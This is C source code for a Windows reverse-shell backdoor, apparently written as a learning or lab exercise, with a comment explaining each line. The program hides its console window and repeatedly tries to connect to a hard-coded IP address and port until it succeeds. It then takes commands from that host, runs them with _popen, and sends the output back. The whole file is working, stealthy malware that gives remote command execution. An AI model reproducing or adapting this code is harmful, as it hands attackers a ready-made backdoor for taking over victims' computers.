#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<winsock2.h>
#include<windows.h>
#include<windows.h>
#include<wininet.h>
#include<windowsx.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>

int sock;


void shell(){
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1){
            memset(buffer,0,sizeof(buffer));
            memset(container,0,sizeof(container));
            memset(total_response,0,sizeof(total_response));

            recv(sock,buffer,sizeof(buffer),0);

            if(strncmp(buffer,"q",1)==0){
                closesocket(sock);
                WSACleanup();
                exit(0);
            }
            else{
                FILE* f;
                f = _popen(buffer,"r");
                while(fgets(container,sizeof(container),f)!=NULL){
                    strcat(total_response,container);
                }  
                send(sock,total_response,sizeof(total_response),0);
                fclose(f);
            }
    }
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    
    HWND stealth; // handle to a window
    AllocConsole(); // creates a nwe console and initializes new stdin stdout and stderr for the console
    stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the newly allocated console window
    ShowWindow(stealth,0);  // use 0 which is SW_HIDE meaning it hides stealth and switches focus to another active window


    struct sockaddr_in Addr;  // Create a instance of sockaddr_in struct
    unsigned short Port;    // variable for port
    char* IP;   // Variable for IP
    WSADATA wsaData;    // Variable to store socket data 

    IP = "192.168.108.129";
    Port = 40005 ;

    if (WSAStartup(MAKEWORD(2,0),&wsaData)!=0){
        exit(1); // This function initializes use of Winsock dll by a process
    }

    sock = socket(AF_INET,SOCK_STREAM,0); // Create a TCP socket which is IPV4 based
    memset(&Addr,0,sizeof(Addr)); // Initialize Addr instance of sockaddr_in to 0
    Addr.sin_family = AF_INET;  // Family of Addr is IPV4
    Addr.sin_addr.s_addr = inet_addr(IP);   // IP to which we should listen to is added to ADDR instance
    Addr.sin_port = htons(Port);    // Port we should listen to is added to ADDR instance


    while(connect(sock,(struct sockaddr *) &Addr, sizeof(Addr))!=0){
        Sleep(10);
    }
    shell();
}